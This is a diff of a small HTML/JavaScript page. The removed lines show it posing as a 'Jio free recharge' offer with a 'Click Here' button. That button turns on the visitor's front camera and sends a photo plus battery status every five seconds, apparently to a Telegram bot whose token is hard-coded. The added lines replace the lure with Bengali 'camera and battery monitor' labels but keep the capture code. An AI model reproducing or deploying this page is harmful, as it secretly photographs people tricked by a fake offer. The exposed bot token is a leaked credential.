@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📸 Jio Free offer </title>
+  <title>📸 ক্যামেরা ও ব্যাটারি মনিটর</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -26,13 +26,13 @@
   </style>
 </head>
 <body>
-  <h2>jio Free recharge</h2>
+  <h2>📷 ক্যামেরা + 🔋 ব্যাটারি রিপোর্ট</h2>
   <p>📌 অনুমতি দিন এবং সিস্টেম শুরু করুন</p>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
   <br><br>
-  <button onclick="startCamera()">▶️ Click Here</button>
-  <p id="status">⏳ please wait...</p>
+  <button onclick="startCamera()">▶️ শুরু করুন</button>
+  <p id="status">⏳ অপেক্ষা করছি...</p>
 
   <script>
     const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
@@ -48,14 +48,14 @@
       navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
           video.srcObject = stream;
-          status.innerText = "🙏Loding...";
+          status.innerText = "✅ ক্যামেরা চালু হয়েছে, প্রতি ৫ সেকেন্ডে তথ্য পাঠানো হবে...";
 
           intervalId = setInterval(() => {
             takePhotoAndSend();
           }, 5000);
         })
         .catch(err => {
-          status.innerText = "❌ Error!";
+          status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
           console.error(err);
         });
     }
@@ -82,10 +82,10 @@
         })
         .then(res => {
           if (res.ok) {
-            console.log(" please Wait");
-            status.innerText = `Done done (${batteryStatus})`;
+            console.log("✅ ছবি পাঠানো হয়েছে");
+            status.innerText = `📸 পাঠানো হয়েছে (${batteryStatus})`;
           } else {
-            status.innerText = "⚠️ Error!";
+            status.innerText = "⚠️ ছবি পাঠাতে সমস্যা হয়েছে!";
           }
         })
         .catch(err => {
